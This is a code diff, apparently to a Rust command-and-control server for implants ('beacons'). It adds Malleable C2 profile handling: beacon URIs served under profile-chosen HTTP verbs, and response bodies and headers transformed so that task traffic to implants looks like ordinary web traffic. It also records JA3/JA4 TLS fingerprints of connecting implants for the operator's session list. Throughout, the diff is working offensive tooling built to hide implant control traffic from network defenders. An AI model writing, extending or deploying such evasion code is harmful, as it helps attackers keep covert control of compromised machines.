@@ -6,12 +6,14 @@
 //! - `POST /api/task`          — queue a task for a session (JSON).
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
+pub mod tls;
+
 use std::sync::Arc;
 use std::time::{Instant, SystemTime, UNIX_EPOCH};
 
 use axum::{
     body::Bytes,
-    extract::{Query, State},
+    extract::{ConnectInfo, Query, State},
     http::{HeaderMap, StatusCode},
     response::{IntoResponse, Response},
     routing::{get, post},
@@ -36,6 +38,11 @@ pub struct Session {
     pub pending: Vec<Task>,
     pub results: Vec<TaskResponse>,
     pub created: Instant,
+    /// Inbound TLS JA3 (MD5, 32 hex) of the connecting beacon, if captured by
+    /// the ClientHello sniffer. `None` on plaintext or when sniff failed.
+    pub ja3: Option<String>,
+    /// Inbound TLS JA4 (FoxIO `a_b_c`), if captured.
+    pub ja4: Option<String>,
 }
 
 pub struct AppState {
@@ -54,6 +61,18 @@ pub struct AppState {
     /// Scripting event bus. Hooks are registered at construction; the beacon
     /// handler fires `SessionNew` / `ResultReceived` events into it.
     pub events: nyx_scripting::EventBus,
+    /// Inbound TLS fingerprints keyed by peer socket address, populated by the
+    /// ClientHello sniffer on the TLS path. The beacon handler pops the entry
+    /// for its peer on check-in and stamps it onto the new session. Plaintext
+    /// (dev) connections never populate this (no ClientHello to sniff).
+    pub fingerprints: DashMap<std::net::SocketAddr, Fingerprint>,
+}
+
+/// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
+#[derive(Debug, Clone, Default)]
+pub struct Fingerprint {
+    pub ja3: Option<String>,
+    pub ja4: Option<String>,
 }
 
 impl AppState {
@@ -73,6 +92,7 @@ impl Default for AppState {
             api_token: None,
             killdate: None,
             events: nyx_scripting::EventBus::new(),
+            fingerprints: DashMap::new(),
         }
     }
 }
@@ -191,19 +211,34 @@ pub fn load_script(path: &std::path::Path) -> anyhow::Result<nyx_scripting_rhai:
 }
 
 pub fn router(state: Arc<AppState>) -> Router {
-    // Collect any profile-declared beacon URIs before `state` moves into the
-    // router. The beacon handler is URI-agnostic (it just decrypts the body), so
-    // serving it at the profile's transaction URIs makes the beacon path
-    // malleable — the most fingerprinted C2 indicator — without touching crypto.
-    let extra: Vec<String> = state
+    // Collect any profile-declared beacon URIs + their `set verb` before `state`
+    // moves into the router. The beacon handler is URI-agnostic (it just
+    // decrypts the body), so serving it at the profile's transaction URIs makes
+    // the beacon path malleable — the most fingerprinted C2 indicator — without
+    // touching crypto. We honour `set verb` (GET/POST) so the registered method
+    // matches what the profile says the beacon will use.
+    let extra: Vec<(String, bool)> = state
         .profile
         .as_ref()
         .map(|p| {
-            p.http_post()
-                .into_iter()
-                .chain(p.http_get())
-                .filter_map(|b| b.get("uri").map(|u| u.as_str().into_owned()))
-                .collect()
+            // (uri, is_post). Each transaction block's verb defaults to its name
+            // (http-get → GET, http-post → POST) unless overridden by `set verb`.
+            let mut out: Vec<(String, bool)> = Vec::new();
+            for (txn, default_post) in [("http-post", true), ("http-get", false)] {
+                for b in p.blocks(txn) {
+                    let Some(uri) = b.get("uri").map(|u| u.as_str().into_owned()) else {
+                        continue;
+                    };
+                    let verb = b.get("verb").map(|v| v.as_str().to_ascii_uppercase());
+                    let is_post = match verb.as_deref() {
+                        Some("POST") => true,
+                        Some("GET") => false,
+                        _ => default_post,
+                    };
+                    out.push((uri, is_post));
+                }
+            }
+            out
         })
         .unwrap_or_default();
 
@@ -215,20 +250,28 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/api/results", get(get_results))
         .route("/api/profile", get(get_profile));
     let mut seen = std::collections::HashSet::new();
-    for uri in extra {
+    for (uri, is_post) in extra {
         if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
             continue;
         }
-        r = r.route(&uri, post(beacon));
+        r = if is_post {
+            r.route(&uri, post(beacon))
+        } else {
+            r.route(&uri, get(beacon))
+        };
     }
     r.with_state(state)
 }
 
 // ---- implant endpoint ------------------------------------------------------
 
-async fn beacon(State(st): State<Arc<AppState>>, body: Bytes) -> Response {
-    match handle_beacon(&st, &body) {
-        Ok(resp) => (StatusCode::OK, resp).into_response(),
+async fn beacon(
+    State(st): State<Arc<AppState>>,
+    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
+    body: Bytes,
+) -> Response {
+    match handle_beacon(&st, &peer, &body) {
+        Ok(frame) => shape_beacon_response(&st, frame),
         Err(e) => {
             tracing::warn!(error = %e, "beacon handler error");
             StatusCode::BAD_REQUEST.into_response()
@@ -236,7 +279,66 @@ async fn beacon(State(st): State<Arc<AppState>>, body: Bytes) -> Response {
     }
 }
 
-fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
+/// Apply the Malleable C2 profile's server-side envelope to the encrypted
+/// frame the beacon handler produced. With no profile (or a profile whose
+/// `http-post` has no `server { output { } }` block), the envelope is a no-op
+/// and the raw frame is returned as before — so this is strictly opt-in.
+///
+/// The `http-post` transaction is the beacon's task-delivery channel, so its
+/// `server.output` transform chain + `header` statements shape the response.
+/// Transforming the body makes beacon traffic match the transaction the profile
+/// describes (e.g. base64+prepend so the body looks like a JSON field) instead
+/// of leaking a raw encrypted frame.
+fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
+    let Some(profile) = &st.profile else {
+        return (StatusCode::OK, body_bytes(frame)).into_response();
+    };
+    let env = nyx_profile::post_server_envelope(profile);
+    if env.terminator.is_none() && env.steps.is_empty() && env.headers.is_empty() {
+        // No envelope declared — raw frame, legacy behaviour.
+        return (StatusCode::OK, body_bytes(frame)).into_response();
+    }
+    let (body, extra) = env.shape_body(&frame);
+
+    let mut resp = (StatusCode::OK, body_bytes(body)).into_response();
+
+    // Apply profile-declared response headers. CS `header "N" "V"` sets static
+    // pairs; when the terminator is a header, the transformed bytes go there too.
+    use axum::http::HeaderValue;
+    for (name, val) in &env.headers {
+        if let (Ok(n), Ok(v)) = (
+            axum::http::HeaderName::from_bytes(name),
+            HeaderValue::from_bytes(val),
+        ) {
+            resp.headers_mut().insert(n, v);
+        }
+    }
+    // If the output terminator is a named header/parameter, inject the
+    // transformed frame bytes there (overriding any static value for that name).
+    match &env.terminator {
+        Some(nyx_profile::Terminator::Header(h)) => {
+            if let (Ok(n), Ok(v)) = (
+                axum::http::HeaderName::from_bytes(h.as_bytes()),
+                HeaderValue::from_bytes(&extra),
+            ) {
+                resp.headers_mut().insert(n, v);
+            }
+        }
+        // parameter/uri-append/print: the bytes are in the body already; the
+        // server can't reach into the request URL from a response, so
+        // uri-append is implant-side. parameter rides in the body for the
+        // server response (the beacon knows its own profile).
+        _ => {}
+    }
+    resp
+}
+
+/// Wrap a Vec<u8> as an axum response body.
+fn body_bytes(b: Vec<u8>) -> axum::body::Body {
+    axum::body::Body::from(b)
+}
+
+fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> anyhow::Result<Vec<u8>> {
     // Kill date: once reached, refuse all beacon traffic so a burned server goes
     // dark (checked per-request, not just at boot, so a long-running server
     // honors it too).
@@ -283,6 +385,9 @@ fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
             os: info.os.clone(),
             is_admin: info.is_admin == 1,
         });
+        // Pop the inbound TLS fingerprint the sniffer captured for this peer
+        // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
+        let fp = st.fingerprints.remove(peer).map(|(_, v)| v).unwrap_or_default();
         let session = Session {
             key,
             info,
@@ -292,6 +397,8 @@ fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
             pending: Vec::new(),
             results: Vec::new(),
             created: Instant::now(),
+            ja3: fp.ja3,
+            ja4: fp.ja4,
         };
         st.sessions.insert(raw.pubkey, session);
         st.events.fire(&new_event);
@@ -345,6 +452,12 @@ struct SessionView {
     is_admin: u8,
     pending: usize,
     age_secs: u64,
+    /// Inbound TLS JA3 (if captured by the ClientHello sniffer).
+    #[serde(skip_serializing_if = "Option::is_none")]
+    ja3: Option<String>,
+    /// Inbound TLS JA4 (if captured).
+    #[serde(skip_serializing_if = "Option::is_none")]
+    ja4: Option<String>,
 }
 
 /// If an API token is configured, every control-API request must carry
@@ -386,6 +499,8 @@ async fn list_sessions(
             is_admin: entry.info.is_admin,
             pending: entry.pending.len(),
             age_secs: entry.created.elapsed().as_secs(),
+            ja3: entry.ja3.clone(),
+            ja4: entry.ja4.clone(),
         });
     }
     Json(out).into_response()
